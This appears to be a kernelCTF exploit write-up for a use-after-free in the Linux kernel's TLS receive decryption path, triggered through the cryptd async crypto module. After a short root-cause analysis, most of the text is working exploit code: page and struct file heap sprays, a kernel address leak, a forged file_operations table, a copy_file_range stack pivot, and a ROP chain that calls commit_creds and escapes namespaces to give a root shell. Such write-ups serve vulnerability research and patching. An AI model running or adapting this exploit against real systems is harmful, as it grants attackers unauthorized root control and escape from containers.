## Root Cause

When zero-copy is not enabled, `tls_decrypt_sg` creates a `clear_skb` [1] to store the decrypted data. The pages of `clear_skb` are then passed to sgout [2].

```c
static int tls_decrypt_sg(struct sock *sk, struct iov_iter *out_iov,
			  struct scatterlist *out_sg,
			  struct tls_decrypt_arg *darg)
{
	// [...]

	if (darg->zc && (out_iov || out_sg)) {
		// [...]
	} else {
		darg->zc = false;

		clear_skb = tls_alloc_clrtxt_skb(sk, skb, rxm->full_len); // [1]
		if (!clear_skb)
			return -ENOMEM;

		n_sgout = 1 + skb_shinfo(clear_skb)->nr_frags;
	}
	// [...]
	if (clear_skb) {
		sg_init_table(sgout, n_sgout);
		sg_set_buf(&sgout[0], dctx->aad, prot->aad_size);

		err = skb_to_sgvec(clear_skb, &sgout[1], prot->prepend_size,
				   data_len + prot->tail_size); // [2]
		if (err < 0)
			goto exit_free;
	} else if (out_iov) {
	// [...]
}
```

After decryption is complete, the pages in sgout are freed in the `tls_decrypt_done` function [3], including the page backing `clear_skb`, even though `clear_skb` itself has not been freed. This leads to a use-after-free condition. If `clear_skb` is later freed, it results in a double free.

```c
static int tls_do_decryption(struct sock *sk,
			     struct scatterlist *sgin,
			     struct scatterlist *sgout,
			     char *iv_recv,
			     size_t data_len,
			     struct aead_request *aead_req,
			     struct tls_decrypt_arg *darg)
{
	// [...]
	if (darg->async) {
		aead_request_set_callback(aead_req,
					  CRYPTO_TFM_REQ_MAY_BACKLOG,
					  tls_decrypt_done, aead_req); // callback
		atomic_inc(&ctx->decrypt_pending);
	} 
    // [...]
}

static void tls_decrypt_done(void *data, int err)
{
	// [...]
	/* Free the destination pages if skb was not decrypted inplace */
	if (sgout != sgin) {
		/* Skip the first S/G entry as it points to AAD */
		for_each_sg(sg_next(sgout), sg, UINT_MAX, pages) {
			if (!sg)
				break;
			put_page(sg_page(sg)); // [3]
		}
	}
	// [...]
}
```

## Exploit Details

Since this is a use-after-free on a page, exploitation is relatively straightforward. To trigger the `tls_decrypt_done` callback, a synchronous request must be issued, which requires the algorithm to be initialized with the `CRYPTO_ALG_ASYNC` flag. In a `kernelCTF` environment, this can be achieved using `cryptd`, an asynchronous crypto module.

```c
static int cryptd_create(struct crypto_template *tmpl, struct rtattr **tb)
{
	struct crypto_attr_type *algt;

	algt = crypto_get_attr_type(tb);
	if (IS_ERR(algt))
		return PTR_ERR(algt);

	switch (algt->type & algt->mask & CRYPTO_ALG_TYPE_MASK) {
	case CRYPTO_ALG_TYPE_SKCIPHER:
		return cryptd_create_skcipher(tmpl, tb, algt, &queue);
	case CRYPTO_ALG_TYPE_HASH:
		return cryptd_create_hash(tmpl, tb, algt, &queue);
	case CRYPTO_ALG_TYPE_AEAD:
		return cryptd_create_aead(tmpl, tb, algt, &queue);
	}

	return -EINVAL;
}

static struct crypto_template cryptd_tmpl = {
	.name = "cryptd",
	.create = cryptd_create,
	.module = THIS_MODULE,
};

static int cryptd_create_aead(struct crypto_template *tmpl,
		              struct rtattr **tb,
			      struct crypto_attr_type *algt,
			      struct cryptd_queue *queue)
{
	// [...]
	inst->alg.base.cra_flags |= CRYPTO_ALG_ASYNC |
		(alg->base.cra_flags & CRYPTO_ALG_INTERNAL);
	// [...]
}
```

Use `AF_ALG` to register `cryptd` for the algorithm:

```c
int sock = socket(AF_ALG, SOCK_SEQPACKET, 0);
struct sockaddr_alg sa = {
    .salg_family = AF_ALG,
    .salg_type = "aead",
    .salg_name = "cryptd(ccm(aes))",
};
bind(sock, (struct sockaddr *)&sa, sizeof(sa));
```

After setting up the server and client, triggering a recv leads to the UAF. To prevent a double free, I use a pipe to keep the socket from being fully released and freeing page again. The pipe also gives me control over when the page is freed.

```c
void run_server(int pipe) {
    pin_cpu(1);
    int server_fd, client_fd;
    struct sockaddr_in server_addr, client_addr;
    socklen_t addr_len = sizeof(client_addr);

    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        perror("socket");
        exit(1);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(PORT);

    if (bind(server_fd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("bind");
        exit(1);
    }

    if (listen(server_fd, 5) < 0) {
        perror("listen");
        exit(1);
    }


    if ((client_fd = accept(server_fd, (struct sockaddr *)&client_addr, &addr_len)) < 0) {
        perror("accept");
        exit(1);
    }

    if (setup_ktls(client_fd, 0) < 0) {
        close(client_fd);
        close(server_fd);
        exit(1);
    }
    char buf[0x20];
    int bytes_received = recv(client_fd, buf, 0x20, 0);
    puts("recv done");
    if (bytes_received > 0) {
    } else {
        perror("recvmsg");
    }
    SYSCHK(read(pipe, buf, 1)); // hold
    puts("close server");
    close(client_fd);
    close(server_fd);
    exit(0);
}

void run_client() {
    sleep(2);

    int sockfd;
    struct sockaddr_in server_addr;

    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        perror("socket");
        exit(1);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(PORT);
    inet_pton(AF_INET, "127.0.0.1", &server_addr.sin_addr);

    if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("connect");
        close(sockfd);
        exit(1);
    }

    if (setup_ktls(sockfd, 1) < 0) {
        close(sockfd);
        exit(1);
    }

    char buf[0x400];

    if (send(sockfd, buf, sizeof(buf), 0) < 0) {
        perror("sendmsg");
    } else {
    }

}
```

Spray pages via the pipe to reclaim the UAF page:

```c
void spray_pipe() {
    char buf[0x1000];
    memset(buf, 'C', sizeof(buf));

    for (int i = 0; i < PIPE_SPRAY_NUM; i++) {
        write(pipe_fd[i][1], buf, sizeof(buf));
        usleep(100);
    }
}
pin_cpu(1);
spray_pipe();
```

After freeing the page again, we spray struct file objects to overwrite it. This results in arbitrary read/write via the pipe, allowing us to tamper with file structures directly:

```c
SYSCHK(write(pipes[1], "A", 1)); // release socket
usleep(50);
int spray_fds[0x80];
char buff[1024] = {};
for (int i = 0; i < sizeof(spray_fds)/4; i++) {
    spray_fds[i] = SYSCHK(open("/tmp/tmp_file", O_RDWR | O_CREAT, 0666));
    // Write i bytes so that the file sets f_pos = i.
    // This makes f_pos act as an index identifying the sprayed file object.
    SYSCHK(write(spray_fds[i], buff, i));
}
```

Leak:

```c
u64 buf[0x1000/8];
for (int i = 0; i < PIPE_SPRAY_NUM; i++) {
    SYSCHK(read(pipe_fd[i][0], buf, sizeof(buf)));
    for (int j = 0; j < sizeof(buf)/8; j++)
        // f_mode (0x4f801f when open (O_RDWR | O_CREAT)) | f_iocb_flags (default = 0)
        if (buf[j] == (F_MODE << 32 | 0)) {
            goto buildrop;
        }
}
for (int i = 0; i < sizeof(spray_fds)/4; i++) {
    SYSCHK(close(spray_fds[i]));
}
puts("retry");
usleep(5000);
system(argv[0]);
exit(0);
buildrop:
// I preserved the page containing the filp objects so I could restore them later.
// During the exploit I overwrote some of the filp structures with my ROP chain once I had arbitrary read/write access.
// After spawning /bin/bash (in getroot), some of those corrupted file structures could be released, which might otherwise trigger a kernel panic.
// To ensure the release process completes cleanly, I restore the page(filp obj) before letting the system free those objects.
memcpy(save_page, buf, sizeof(buf));
close(sock);
// file->f_pos_lock->wait_list->next, default is &wait_list = file + OFFSET_FILE_POS_LOCK_WAITLIST
heap_base = (buf[OFFSET_FILE_POS_LOCK_WAITLIST/sizeof(uint64_t)]-OFFSET_FILE_POS_LOCK_WAITLIST) >> 12 << 12;
info("heap_base", heap_base);
kbase = buf[OFFSET_FILE_FOP/sizeof(uint64_t)] - SHMEM_FILE_OPERATIONS;
// [...]
```

RIP control via `copy_file_range`:

```c
SYSCALL_DEFINE6(copy_file_range, int, fd_in, loff_t __user *, off_in,
		int, fd_out, loff_t __user *, off_out,
		size_t, len, unsigned int, flags)
{
	// [...]
	ret = vfs_copy_file_range(f_in.file, pos_in, f_out.file, pos_out, len,
				  flags);
	// [...]
}

ssize_t vfs_copy_file_range(struct file *file_in, loff_t pos_in,
			    struct file *file_out, loff_t pos_out,
			    size_t len, unsigned int flags)
{
	// [...]
	if (!splice && file_out->f_op->copy_file_range) {
		ret = file_out->f_op->copy_file_range(file_in, pos_in,
						      file_out, pos_out,
						      len, flags); // take control RIP
		goto done;
	}
    // [...]
	return ret;
}
```

```c
// f_pos was set to i in the spraying loop, so this gives us the index i of the victim file (files[0]) and pivot file (files[1]) in spray_fds.
size_t victim_file_idx = *(size_t *)(victim_file_addr + OFFSET_FILE_FPOS);
size_t pivot_id = *(size_t *)(victim_file_addr+ALIGNED_FILE_SZ + OFFSET_FILE_FPOS);

// files[1] to control RIP, pivot stack to files[2]
u64* rop = victim_file_addr+ALIGNED_FILE_SZ*1;
int idx = 0;
idx++; // skip f_rcuhead->next
// should not modify f_rcuhead->next; its default value is NULL, and it should be left that way to avoid potential issues.
rop[idx++] = pop_rdi;
idx++; // skip f_mode (4 byte) + f_iocb_flags (4 byte)
// f_mode cannot be changed because it is used to check permissions in copy_file_range; if it is modified, the exploit will fail.
rop[idx++] = kbase+0x79bb56; // ret 0xd8 (0xd8 = ALIGNED_FILE_SZ - idx*8 (5 * 8), after ret, rsp will point to files[2])
rop[idx++] = pop_rdi+1; // ret


// files[2] to create ROP chain
idx = 0;
rop = (char*)rop + ALIGNED_FILE_SZ; 
rop[idx++] = pop_rdi;
rop[idx++] = init_cred;
rop[idx++] = commit_creds;
rop[idx++] = pop_rdi;
rop[idx++] = 1;
rop[idx++] = find_task_by_vpid;
rop[idx++] = xchg_rdi_rax;
rop[idx++] = 0; //
rop[idx++] = pop_rsi;
rop[idx++] = init_nsproxy;
rop[idx++] = switch_task_namespaces;
rop[idx++] = pop_rdi;
rop[idx++] = init_fs;
rop[idx++] = copy_fs_struct;
rop[idx++] = push_rax_pop_rbx;
rop[idx++] = pop_rdi;
rop[idx++] = getpid();
rop[idx++] = find_task_by_vpid;
rop[idx++] = pop_rdi;
rop[idx++] = current_fs_offset;
rop[idx++] = add_rax_rdi;
rop[idx++] = mov_irax_rbx;
rop[idx++] = 0; //
rop[idx++] = kpti_trampoline;
rop[idx++] = 0; //
rop[idx++] = 0; //
rop[idx++] = (uint64_t)getroot;
rop[idx++] = user_cs;
rop[idx++] = user_rflags;
rop[idx++] = user_sp;
rop[idx++] = user_ss;


u64 fake_ops_offset = ALIGNED_FILE_SZ*3;
// files[3] to fake file_operations
struct file_operations *fake_fops = (struct file_operations *)((char *)buf + fake_ops_offset);

// push rdx ; pop rsp ; imul edi, edi, -0x7b ; ror byte ptr [rdi], 0x85 ; ret
fake_fops->copy_file_range = magic_gadget;
fake_fops->remap_file_range = magic_gadget;
// set file->f_op file victim_file_idx ( files[0] )
buf[OFFSET_FILE_FOP/sizeof(uint64_t)] = heap_base + fake_ops_offset; 
char tmp[0x1000];

for (int i = 0; i < PIPE_SPRAY_NUM; i++) {
    SYSCHK(write(pipe_fd[i][1], buf, sizeof(buf)));
    SYSCHK(read(pipe_fd[i][0], tmp, sizeof(tmp)));
}

// offset_out > offset_in
off_t offset_in = 0, offset_out = 1;
copy_file_range(spray_fds[victim_file_idx], &offset_in, spray_fds[pivot_id], &offset_out, 1, 0);
_wait();
```
To gain RIP control, I make use of four file structures.

- **files[0] (`victim_file_idx`)**: its `f_op` pointer is overwritten so that invoking `copy_file_range` dispatches execution to my `magic_gadget`.
- **files[1] (`pivot_id`)**: I prepare three key gadgets here â€” `pop rdi; ret`, `ret 0xd8` and `ret`. These two files ( 0 & 1 ) are directly passed into `copy_file_range`, which means they must still satisfy kernel file checks, so I cannot host the full ROP chain on them.
- **files[2]**: this file holds the actual ROP chain. After executing the `ret 0xd8` gadget, control flow pivots here, continuing execution of the chain.
- **files[3]**: used to provide the fake `file_operations` structure that `files[0]` will dereference.

After copy_file_range is invoked, the flow is:

- `files[0]->copy_file_range` is called, which jumps to `magic_gadget(files[0](rdi), off_in(rsi), files[1](rdx), off_out(rcx), 1(r8), 0(r9))`.

- At this point, `RIP` is redirected to the gadget sequence:

  ```
  push rdx ; pop rsp ; imul edi, edi, -0x7b ; ror byte ptr [rdi], 0x85 ; ret (magic_gadget)
  ```

- The `push rdx ; pop rsp` pair pivots the stack to the address stored in `rdx` (which corresponds to `files[1]`).

- Execution then performs `pop rdi ; ret` followed by `ret 0xd8`, which advances `rsp` into `files[2]`.

- Since `files[2]` was prepared with the ROP chain, the pivot lands directly on it, and the chain executes as intended.
